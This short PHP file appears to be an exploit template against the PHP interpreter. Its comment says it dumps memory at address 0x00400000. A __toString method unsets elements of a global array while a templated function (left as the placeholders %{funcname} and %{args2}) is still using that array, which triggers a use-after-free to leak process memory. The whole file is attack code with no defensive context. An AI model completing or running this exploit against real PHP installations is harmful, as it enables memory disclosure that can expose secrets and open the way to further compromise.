<?php

// dump data at memory address 0x00400000, length 16 to filename "outtmp"
class dummy {
	public function __toString() {
		unset($GLOBALS['arr1'][0]);
		unset($GLOBALS['arr1'][1]);
		return '';
	}
}

$arr1 = array(new dummy, 1);
$fp = fopen('php://memory', 'w');
%{funcname}($fp, %{args2}&$arr1);
fclose($fp);
